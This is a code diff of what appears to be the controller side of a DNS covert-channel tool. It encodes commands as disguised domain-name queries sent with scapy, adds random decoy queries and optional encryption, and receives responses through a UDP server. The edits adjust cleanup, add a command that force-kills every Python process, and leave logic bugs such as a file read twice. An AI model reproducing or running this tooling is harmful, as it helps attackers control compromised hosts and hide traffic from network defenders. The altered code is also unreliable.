@@ -11,6 +11,7 @@ import signal
 
 def clear_files_on_exit(signum, frame):
     open('cloaked.payload', 'w').close()
+    open('cloaked2.payload', 'w').close()
     open('cloaked_response.txt', 'w').close()
     print("Files cleared on exit.")
     exit(0)
@@ -30,9 +31,10 @@ def send_command(command, dns='localhost', args=None):
     for i in range(rnd_fqdn):
         fqdn_str = random.choice(open(cipher).readlines()).strip()
         dns_req = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(unicastresponse=1, qname=fqdn_str))
+        
         dns_req[DNS].id = rnd_fqdn+65530
         send(dns_req, verbose=0)
-        rnd_fqdn -= 1
+        
 
     encrypted_command = encrypt_message(command, key) if args is not None and args.encrypt else command
     cloaked_command = "cloaked_command.txt"
@@ -50,7 +52,6 @@ def send_command(command, dns='localhost', args=None):
 
 
     # Send command using dns requests, the checksum is the index of the fqdn in the array so that the receiver can check if any packets are missing
-    
     with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
@@ -60,18 +61,21 @@ def send_command(command, dns='localhost', args=None):
             send(dns_req, verbose=0)
 
 
-    # Remove command file
-    #os.remove(cloaked_command)
 
 
 def receive_response(dns='localhost', local=False, args=None, seq_id=0):
-    cloakedFile = "cloaked.payload"
+    # clear files
+    open('cloaked_response.txt', 'w').close()
+    open('decloaked_response.txt', 'w').close()
+    open('cloaked2.payload', 'w').close()
+
+    start_udp_server()
+    cloaked_response = "cloaked2.payload"
     if local:
         subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
         dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
-        cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
+        cloaked_response = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
-    cloaked_response = cloakedFile 
     
     decloaked_response = "decloaked_response.txt"
     
@@ -83,13 +87,6 @@ def receive_response(dns='localhost', local=False, args=None, seq_id=0):
             receive_response(local, args)
         timer = threading.Timer(3.0, timeout_handler)
         timer.start()
-    '''
-    with open(cloaked_response, 'r') as file:
-        if file.read().strip() == "":
-            os.remove(cloaked_response) if os.path.exists(cloaked_response) else None
-            print("No response received.")
-            return
-    '''
         
     # Decloakify the command
     if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
@@ -99,20 +96,26 @@ def receive_response(dns='localhost', local=False, args=None, seq_id=0):
 
     # Decrypt the command
     with open(decloaked_response, 'r') as file:
+        print('response: ', file.read())
         encrypted_response = file.read().strip()
     response = decrypt_message(encrypted_response, key) if args is not None and args.encrypt else encrypted_response
-    print(f'\n {response}')
+    
     if response=='�':
         send_command(command, args=args)
     elif response.startswith('�') and response[1:].isdigit():
-        #receive_response(dns, local, args, int(response[1:]))
         start_udp_server(seq_id)
-        
+    
 
     # Remove useless file after execution
     os.remove(cloaked_response) if os.path.exists(cloaked_response) else None
     os.remove(decloaked_response)
-    start_udp_server()
+    clear_files_on_exit(0, 0)
+    # kill dns server windows
+    if os.name == 'nt':
+        os.system("taskkill /f /im python.exe")
+    else:
+        os.system("pkill -f dns_server.py")
+    #start_udp_server()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
